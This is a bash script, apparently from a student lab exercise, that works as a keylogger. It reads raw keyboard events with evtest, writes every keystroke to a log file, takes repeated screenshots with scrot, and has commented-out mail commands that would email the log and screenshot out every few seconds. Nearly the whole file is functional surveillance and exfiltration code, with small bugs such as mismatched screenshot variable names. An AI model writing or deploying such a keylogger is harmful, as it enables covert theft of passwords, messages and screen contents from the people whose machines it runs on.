#!/bin/bash

# --- CONFIGURATION ---

DEVICE="/dev/input/event3"    # keyboard device
FILEPATH="/home/ashfak-uzzaman/Lab Practice"               
LOGFILE="$FILEPATH/key_strokes.txt"               # Log file
SCREENSHOT_FILE="$FILEPATH/screenshot_${current_user}_$(date +'%Y%m%d_%H%M%S').png"


TO_EMAIL="cse_182210012101041@lus.ac.bd"          # Recipient
FROM_EMAIL="cse_182210012101041@lus.ac.bd"                 # Sender
SUBJECT="Key Log of \"$(hostname)\""  # Email subject
MESSAGE="Key strokes of last 20 seconds"   # Message              
SEND_INTERVAL=10           # Time in seconds

# --- CHECK ROOT ---

if [[ $EUID -ne 0 ]]; then
    sudo $0
fi

# --- MAKE DIRECTORY  ---
if [[ ! -d "$FILEPATH" ]]; then
    mkdir -p "$FILEPATH"
    echo "Directory created: $FILEPATH"
else
    echo "Directory already exists: $FILEPATH"
fi


# --- CREATE FILE ---
if [[ ! -f "$LOGFILE" ]]; then
    touch "$LOGFILE"
    echo "Log file created: $LOGFILE"
else
    echo "Log file already exists: $LOGFILE"
fi

# --- Ensure log file is writable ---
chmod 666 "$LOGFILE"

# --- Variables for debouncing keys ---
declare -A last_time_map

# Function to log keys with debounce (300 ms)
log_key() {
    local key="$1"
    echo "$(date '+%Y-%m-%d %H:%M:%S') $key" >> "$LOGFILE"
}

# --- Start Keylogging in Background ---

echo "Starting keylogger... Output: $LOGFILE"
> "$LOGFILE"

# Start keylogger pipeline in background, save PID
(
    evtest "$DEVICE" | \
    stdbuf -oL grep "EV_KEY.*value 1" | \
    while read -r line; do
        RAW_KEY=$(echo "$line" | sed -n 's/.*\(KEY_[A-Z0-9_]\+\).*/\1/p')

        case "$RAW_KEY" in
            KEY_SPACE) KEY="(SPACE)" ;;
            KEY_ENTER) KEY="(ENTER)" ;;
            KEY_BACKSPACE) KEY="(BACKSPACE)" ;;
            KEY_TAB) KEY="(TAB)" ;;
            KEY_LEFTSHIFT|KEY_RIGHTSHIFT) KEY="(SHIFT)" ;;
            KEY_LEFTCTRL|KEY_RIGHTCTRL) KEY="(CTRL)" ;;
            KEY_LEFTALT|KEY_RIGHTALT) KEY="(ALT)" ;;
            KEY_ESC) KEY="(ESC)" ;;
            KEY_CAPSLOCK) KEY="(CAPSLOCK)" ;;
            KEY_DOT) KEY="." ;;
            KEY_COMMA) KEY="," ;;
            KEY_SLASH) KEY="/" ;;
            KEY_MINUS) KEY="-" ;;
            KEY_EQUAL) KEY="=" ;;
            KEY_SEMICOLON) KEY=";" ;;
            KEY_APOSTROPHE) KEY="'" ;;
            KEY_LEFTBRACE) KEY="[" ;;
            KEY_RIGHTBRACE) KEY="]" ;;
            KEY_BACKSLASH) KEY="\\" ;;
            KEY_GRAVE) KEY="\`" ;;
            *) KEY=$(echo "$RAW_KEY" | sed 's/KEY_//') ;;
        esac

        # Call log_key function to debounce and write
        log_key "$KEY"
    done
) &
KEYLOGGER_PID=$!

# --- Trap for cleanup on exit ---
trap "echo; echo 'Stopping...'; kill $KEYLOGGER_PID; wait $KEYLOGGER_PID 2>/dev/null; exit" SIGINT SIGTERM

# --- Email sender loop ---
echo "Starting auto-mailer every $SEND_INTERVAL seconds..."

while true; do
    sleep "$SEND_INTERVAL"

    # --- Check session type ---
    if [[ "$XDG_SESSION_TYPE" != "x11" ]]; then
        echo "This script only works on Xorg (X11). Current session: $XDG_SESSION_TYPE"
        exit 1
    fi

    # --- Take screenshot silently using scrot ---
    if command -v scrot &> /dev/null; then
        scrot "$SCREENSHOT"
    else
        echo "scrot is not installed. Install it with: sudo apt install scrot"
        exit 1
    fi

    # --- Check if screenshot exists ---
    if [[ ! -f "$SCREENSHOT" ]]; then
        echo "Screenshot failed!"
        exit 1
    fi

    if [[ -s "$LOGFILE" ]]; then

        #mail -s "$SUBJECT" -A "$LOGFILE" "$TO_EMAIL" <<< $MESSAGE

        # mail -s "$SUBJECT" \
        #      -A "$LOGFILE" \
        #      -A "$SCREENSHOT_FILE" \
        #      "$TO_EMAIL" <<< "$MESSAGE"

        
        # echo "Please find the attached log file." | mail -s "Pressed Keys" -A "$LOGFILE" "$TO_EMAIL"
      
        status=$?  # captures the exit status of the previous command

        if [[ $status -eq 0 ]]; then
            #echo "Sent Mail"
            > "$LOGFILE"
        fi
    fi

done
